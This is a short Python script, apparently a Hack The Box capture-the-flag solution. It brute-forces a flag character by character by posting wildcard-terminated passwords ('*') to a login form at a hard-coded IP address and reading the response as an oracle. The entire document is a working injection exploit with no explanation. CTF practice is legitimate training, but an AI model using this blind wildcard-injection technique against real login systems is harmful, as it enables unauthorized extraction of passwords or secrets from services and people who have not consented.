import requests

url = 'http://46.101.23.188:30595/login'
r = requests.session()
t = 0
d = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_}'
password = ''
flag = 'HTB{'
while (t != 1):
    for i in range(0, len(d)):
        password = flag + d[i]
        print('[-]testing  %s     ' % (flag + d[i]), end='')
        password = password + '*'
        data = {
            'username': 'reese',
            'password': password
        }
        html = r.post(url=url, data=data).text
        if ('No search results' in html):
            flag += d[i]
            print("success")
            print("[+]%s" % flag)
        else:
            print("failed")
        if (flag[len(flag) - 1] == '}'):
            t = 1
print("flag:%s" % flag)
